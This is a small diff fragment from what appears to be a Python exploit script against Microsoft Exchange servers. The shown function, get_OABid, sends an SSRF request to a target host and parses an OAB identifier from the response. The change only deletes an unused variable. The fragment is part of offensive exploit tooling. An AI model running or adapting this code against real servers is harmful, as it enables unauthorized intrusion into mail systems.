@@ -221,7 +221,6 @@ def get_OABid(session, host, CN, ECP_canary):
     json_payload = get_RawIdentity
 
     response = do_SSRF(session, "post", host, ssrf_url, ssrf_data=json_payload, ssrf_headers=content_type, is_json=1)
-    content = response.content
     
     OABid = re.findall(rb'"RawIdentity":"(.+?)"', response.content)
     if len(OABid) == 0:
